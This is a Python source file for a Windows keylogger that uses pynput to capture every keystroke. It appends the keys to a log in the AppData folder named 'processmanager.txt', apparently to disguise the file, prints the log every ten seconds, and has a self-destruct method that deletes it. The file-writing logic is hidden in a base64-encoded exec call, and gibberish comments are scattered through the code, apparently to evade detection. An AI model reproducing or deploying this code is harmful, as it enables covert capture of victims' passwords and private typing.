import os
from pynput.keyboard import Listener
from time import sleep
import threading
from base64 import b64decode
#dpwajdpiwadawjdiwadjwaidawpijdip
class Keylogger():
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] +'\\processmanager.txt'
#djadjipwadpjawidjw
    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        #djadpwjadpiwpaijwaipjiwajdi
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []
#ijdoijawojdpiwajdwjadiwjaiodj
    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()
        #ojdwajpidjwpaijdiaojdowaijdiwaod
    def write_file(self, keys):
        exec(b64decode("d2l0aCBvcGVuKHNlbGYucGF0aCwgJ2EnKSBhcyBmOg0KICAgIGZvciBrZXkgaW4ga2V5czoNCiAgICAgICAgayA9IHN0cihrZXkpLnJlcGxhY2UoIiciLCAiIikNCiAgICAgICAgaWYgay5maW5kKCdiYWNrc3BhY2UnKSA+IDA6DQogICAgICAgICAgICBmLndyaXRlKCcgQmFja3NwYWNlICcpDQogICAgICAgIGVsaWYgay5maW5kKCdlbnRlcicpID4gMDoNCiAgICAgICAgICAgIGYud3JpdGUoJ1xuJykNCiAgICAgICAgZWxpZiBrLmZpbmQoJ3NoaWZ0JykgPiAwOg0KICAgICAgICAgICAgZi53cml0ZSgnIFNoaWZ0ICcpDQogICAgICAgIGVsaWYgay5maW5kKCdzcGFjZScpID4gMDoNCiAgICAgICAgICAgIGYud3JpdGUoJyAnKQ0KICAgICAgICBlbGlmIGsuZmluZCgnY2Fwc19sb2NrJykgPiAwOg0KICAgICAgICAgICAgZi53cml0ZSgnIGNhcHNfbG9jayAnKQ0KICAgICAgICBlbGlmIGsuZmluZCgnS2V5Jyk6DQogICAgICAgICAgICBmLndyaXRlKGsp"))
    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        sleep(10)
        logs = keylog.read_logs()
        print(logs)
    t.join()
